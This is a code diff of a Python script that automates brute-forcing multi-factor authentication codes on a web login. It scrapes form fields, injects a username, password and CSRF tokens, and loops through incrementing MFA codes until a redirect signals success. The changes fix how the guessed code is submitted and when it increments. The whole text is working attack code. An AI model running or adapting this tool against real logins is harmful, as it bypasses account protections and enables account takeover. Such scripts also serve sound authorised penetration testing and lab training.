@@ -40,9 +40,7 @@ mfanumber = "{0:0" + mfachars + "}"
 nicemfa = mfanumber.format(mfa)
 
 
-# Set login2 to None for conflict resolution
 login2 = ""
-	 
 
 def lookup():
 	#Perform a get request against the ip to check if the host is up
@@ -148,47 +146,45 @@ def threads():
 def requestor():
 	if url != "":
 		requestor_part1()
-		if login2 != "":
-			requestor_part2()
+	if login2 != "":
+		requestor_part2()
 	
 def requestor_part1():
 	global data1
-	if url != "":
-		data1 = ""
-		request1 = client.get(url)
-		soup = BeautifulSoup(request1.content, "html.parser")
-		inputkey1 = soup.findAll('input')
-		for input in inputkey1:
-			data1 += str(input.attrs['name'])
-			data1 += "="
-			if "user" in input.attrs['name']:
-				data1 += username
-			elif "pass" in input.attrs['name']:
-				data1 += password
-			elif "csrf" in input.attrs['name']:
-				data1 += token1
-			else:
-				data1 += input.attrs['value']
-			data1 += "&"	
+	data1 = ""
+	soup1 = BeautifulSoup(request1.content, "html.parser")
+	inputkey1 = soup1.findAll('input')
+	for input in inputkey1:
+		data1 += str(input.attrs['name'])
+		data1 += "="
+		if "user" in input.attrs['name']:
+			data1 += username
+		elif "pass" in input.attrs['name']:
+			data1 += password
+		elif "csrf" in input.attrs['name']:
+			data1 += token1
+		else:
+			data1 += input.attrs['value']
+		data1 += "&"	
 
 def requestor_part2():
 	global data2
-	if login2 != "":
-		data2 = ""
-		soup = BeautifulSoup(request2.content, "html.parser")
-		inputkey2 = soup.findAll('input')
-		for input in inputkey2:
-			data2 += str(input.attrs['name'])
-			data2 += "="
-			if "user" in input.attrs['name']:
-				data2 += username
-			elif "pass" in input.attrs['name']:
-				data2 += password
-			elif "csrf" in input.attrs['name']:
-				data2 += token2
-			elif "mfa" in input.attrs['name']:
-				continue
-			data2 += "&"
+	global nicemfa
+	data2 = ""
+	soup2 = BeautifulSoup(request2.content, "html.parser")
+	inputkey2 = soup2.findAll('input')
+	for input in inputkey2:
+		data2 += str(input.attrs['name'])
+		data2 += "="
+		if "user" in input.attrs['name']:
+			data2 += username
+		elif "pass" in input.attrs['name']:
+			data2 += password
+		elif "csrf" in input.attrs['name']:
+			data2 += token2
+		elif "mfa" in input.attrs['name']:
+			data2 += nicemfa
+		data2 += "&"
 
 
 def makerequests():
@@ -215,16 +211,15 @@ def mfa_brute():
 		gather_csrf1()
 		gather_csrf2()
 		requestor()
-		mfa_attempt = client.post(login2, data=data2 + nicemfa)
-		while mfa_attempt.status_code != 302:
+		mfa_attempt = client.post(login2, data=data2)
+		while not mfa_attempt.status_code == 302:
 			gather_csrf1()
+			requestor()
 			login()
 			gather_csrf2()
 			requestor()
-			mfa += 1
-			nicemfa = mfanumber.format(mfa)
 			print("Testing: " + nicemfa)
-			mfa_attempt = client.post(login2, data=data2 + nicemfa)
+			mfa_attempt = client.post(login2, data=data2)
 			if mfa_attempt.status_code == 302:
 				print("MFA code found: " + nicemfa +"\n Program will now exit.")
 				quit()
@@ -232,10 +227,12 @@ def mfa_brute():
 				print("Error testing code: " + nicemfa + "\n Continuing, but note the error.")
 			elif mfa_attempt.status_code != 200:
 				print("Status code is not expected.  MFA code may be correct, or requests may be blocked or misconfigured.")
-				
+			mfa += 1
+			nicemfa = mfanumber.format(mfa)
+
 	else:
 		mfa_attempt = client.post(login2, data=data2 + nicemfa)
-		while mfa_attempt.status_code != 302:
+		while not mfa_attempt.status_code == 302:
 			login()
 			mfa += 1
 			nicemfa = mfanumber.format(mfa)
